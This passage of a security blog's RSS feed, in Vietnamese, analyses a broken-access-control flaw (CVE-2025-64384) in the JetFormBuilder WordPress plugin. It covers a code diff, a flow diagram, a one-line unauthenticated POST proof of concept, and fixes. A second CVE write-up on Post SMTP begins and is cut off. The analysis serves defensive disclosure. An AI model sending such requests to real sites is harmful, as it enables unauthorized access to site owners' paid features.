noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;JetFormBuilder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Thực hiện diff code:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#34; title=&#34;Sự khác biệt giữa bản lỗi và bản vá&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự khác biệt giữa bản lỗi và bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#39; alt=&#34;Diff&#34; height=&#34;820&#34; width=&#34;1535&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự khác biệt giữa bản lỗi và bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản lỗi (v3.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;class &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt; tồn tại các hàm trả về giá trị tương ứng với các tham số để đăng ký REST API trong WordPress&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;route: &lt;code&gt;/ai/generate&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;method: &lt;code&gt;POST&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;callback: &lt;code&gt;run_callback&lt;/code&gt; dùng để tạo form bằng AI với có giới hạn (15 request / month)&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#34; title=&#34;Tạo form với AI&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/ai.png&#34; data-sub-html=&#34;&lt;h2&gt;AI&lt;/h2&gt;&lt;p&gt;Tạo form với AI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#39; alt=&#34;AI&#34; height=&#34;875&#34; width=&#34;1026&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo form với AI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Đây là hàm dùng để đăng ký một endpoint mới cho REST API. Cấu trúc cơ bản như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route( &#xA;    string $namespace, &#xA;    string $route, &#xA;    array  $args = array(), &#xA;    bool   $override = false &#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$namespace&lt;/code&gt;: Không gian tên cho route, thường là tên plugin hoặc module.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Ví dụ: &amp;quot;myplugin/v1&amp;quot;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;&lt;code&gt;$route&lt;/code&gt;: Đường dẫn của endpoint (sau namespace).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Ví dụ: &amp;quot;/items&amp;quot;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt;: Mảng cấu hình cho route, gồm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;methods&lt;/code&gt;: Phương thức HTTP (GET, POST, PUT, DELETE&amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;callback&lt;/code&gt;: Hàm xử lý khi endpoint được gọi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt;: Hàm kiểm tra quyền truy cập.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;args&lt;/code&gt;: (tuỳ chọn) Các tham số truyền vào endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;$override&lt;/code&gt;: Mặc định &lt;code&gt;false&lt;/code&gt;. Nếu &lt;code&gt;true&lt;/code&gt;, sẽ ghi đè route đã tồn tại.&lt;/p&gt;&#xA;&lt;p&gt;Đối chiếu với các hàm trong class &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt;, ta thấy API nếu được đăng ký sẽ thiếu thành phần &lt;code&gt;permission_callback&lt;/code&gt; để kiểm tra quyền truy cập, khiến cho tất cả user (kể các Unauthenticated) có thể gọi đến endpoint này, sử dụng chức năng tạo form bằng AI một cách tuỳ ý.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v3.5.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Generate_Form_Endpoint extends Rest_Api_Private_Endpoint_Base&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gián tiếp kế thừa &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt; thông quan việc kế thừa &lt;code&gt;Rest_Api_Private_Endpoint_Base&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;abstract class Rest_Api_Private_Endpoint_Base extends Rest_Api_Endpoint_Base {&#xA;&#x9;public function check_permission(): bool {&#xA;&#x9;&#x9;return current_user_can( &amp;#39;edit_jet_fb_forms&amp;#39; ); // just for admin&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;check_permission&lt;/code&gt; được tạo để ghi đè lại &lt;code&gt;check_permission&lt;/code&gt; của &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt;, xác định rằng nó chỉ dành cho admin.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;abstract class Rest_Api_Endpoint_Base implements Rest_Fetch_Endpoint {&#xA;    public function check_permission(): bool {&#xA;&#x9;&#x9;return true; // permission_callback: true&#xA;&#x9;}&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;Plugin đã đăng ký một action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;rest_api_init&amp;#39;, array( $this, &amp;#39;register_routes&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;rest_api_init&lt;/code&gt;: Hook này được gọi khi WordPress khởi tạo &lt;strong&gt;REST API&lt;/strong&gt;, khi đó callback &lt;code&gt;register_routes&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    foreach ( $this-&amp;gt;routes() as $route ) {&#xA;        $endpoint_args = $route-&amp;gt;get_overridden_args()&#xA;            ?: array( // phpcs:ignore Universal.Operators.DisallowShortTernary.Found&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; $route::get_methods(),&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $route, &amp;#39;run_callback&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $route, &amp;#39;check_permission&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; $route-&amp;gt;get_common_args(),&#xA;            );&#xA;&#xA;        $result = register_rest_route(&#xA;            $route::get_namespace(), // jet-form-builder/v1/&#xA;            &amp;#34;/{$route::get_rest_base()}&amp;#34;,&#xA;            $endpoint_args,&#xA;            $route-&amp;gt;get_override()&#xA;        );&#xA;&#xA;        if ( ! $result ) {&#xA;            _doing_it_wrong(&#xA;                __METHOD__,&#xA;                // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped&#xA;                &amp;#34;Error on register REST API route: {$route::get_namespace()}/{$route::get_rest_base()}&amp;#34;,&#xA;                &amp;#39;1.4.0&amp;#39;&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;register_routes&lt;/code&gt; sẽ duyệt qua các route và gọi đến &lt;code&gt;register_rest_route&lt;/code&gt; để đăng ký API, trong đó &lt;code&gt;$this-&amp;gt;routes()&lt;/code&gt; là các route được đăng ký bằng 2 cách:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Kế thừa &lt;code&gt;Rest_Api_Controller_Base&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Controller extends Rest_Api_Controller_Base {&#xA;    protected $routes = array();&#xA;    public function __construct() {&#xA;        $this-&amp;gt;routes = array(&#xA;            new Get_Form_Fields(),&#xA;            new Install_Migrations_Endpoint(),&#xA;        );&#xA;    }&#xA;&#xA;    public function routes(): array {&#xA;        return $this-&amp;gt;routes;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Gọi đến:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rest_api-&amp;gt;get_controller()-&amp;gt;install( new Generate_Form_Endpoint() );&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker (Unauthenticated user)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-json/jet-form-builder/v1/ai/generate&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;WordPress REST API receives request&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;JetFormBuilder register_routes() is triggered via rest_api_init&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Generate_Form_Endpoint registered with: methods: POST callback: run_callback permission_callback: true (default)&amp;#34;]&#xA;--&amp;gt; F{&amp;#34;Is permission_callback properly defined?&amp;#34;}&#xA;F -- No (&amp;lt;=3.5.3) --&amp;gt; G[&amp;#34;Access granted to all users&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;run_callback executed → AI form generation&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Attacker bypasses intended restriction (15 requests/month)&amp;#34;]&#xA;F -- Yes (&amp;gt;=3.5.4) --&amp;gt; J[&amp;#34;check_permission() requires current_user_can(&amp;#39;edit_jet_fb_forms&amp;#39;)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Only Admin can access → Exploit prevented&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request với Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/jet-form-builder/v1/ai/generate HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;prompt=create malicious form submit&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/resp.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1492&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64384 xuất phát từ việc &lt;strong&gt;thiếu &lt;code&gt;permission_callback&lt;/code&gt;&lt;/strong&gt; cho REST API &lt;code&gt;/ai/generate&lt;/code&gt; trong JetFormBuilder &amp;lt;= 3.5.3, cho phép người dùng &lt;strong&gt;không xác thực&lt;/strong&gt; gọi endpoint và lạm dụng tính năng tạo form bằng AI. Bản vá 3.5.4 đã buộc kiểm tra quyền bằng &lt;code&gt;current_user_can(&#39;edit_jet_fb_forms&#39;)&lt;/code&gt;, giới hạn truy cập chỉ cho admin và loại bỏ khả năng khai thác.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn khai báo &lt;code&gt;permission_callback&lt;/code&gt; khi đăng ký REST API.&lt;/li&gt;&#xA;&lt;li&gt;Không dựa vào giới hạn logic nếu chưa có kiểm soát quyền truy cập.&lt;/li&gt;&#xA;&lt;li&gt;Kế thừa đúng base class có thể ngăn lỗi bảo mật nghiêm trọng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/jetformbuilder/vulnerability/wordpress-jetformbuilder-plugin-3-5-3-broken-access-control-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin &amp;lt;= 3.5.3 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12887 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-08-cve-2025-12887/</link>
      <pubDate>Mon, 08 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-08-cve-2025-12887/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-08-cve-2025-12887/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Post SMTP&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; dễ bị tấn công &lt;strong&gt;vượt quyền xác thực&lt;/strong&gt; trong tất cả các &lt;strong&gt;phiên bản&lt;/strong&gt; cho đến và bao gồm &lt;strong&gt;3.6.1&lt;/strong&gt;. Nguyên nhân là do plugin không xác minh đúng cách rằng &lt;strong&gt;người dùng&lt;/strong&gt; có được phép cập nhật &lt;strong&gt;token OAuth&lt;/strong&gt; trong hàm &lt;strong&gt;&amp;lsquo;handle_gmail_oauth_redirect&amp;rsquo;&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;kẻ tấn công&lt;/strong&gt; đã &lt;strong&gt;xác thực&lt;/strong&gt;, với quyền truy cập từ cấp độ &lt;strong&gt;người đăng ký&lt;/strong&gt; trở lên, chèn các &lt;strong&gt;thông tin xác thực OAuth&lt;/strong&gt; không hợp lệ hoặc do &lt;strong&gt;kẻ tấn công kiểm soát&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.6.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/post-smtp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post SMTP Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Post SMTP&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.6.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool 